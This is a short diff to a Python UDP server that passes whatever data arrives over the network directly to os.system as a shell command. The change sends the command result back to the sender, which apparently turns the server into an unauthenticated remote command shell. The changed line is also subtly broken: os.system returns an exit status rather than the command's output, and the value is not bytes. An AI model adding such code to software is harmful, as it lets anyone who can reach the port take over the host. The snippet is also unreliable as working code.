@@ -17,7 +17,7 @@ def udp_server():
         cmd_output = os.system(data)
         print(cmd_output)
 
-        server.sendto('ACK', addr)
+        server.sendto(cmd_output, addr)
 
 if __name__ == '__main__':
     udp_server()
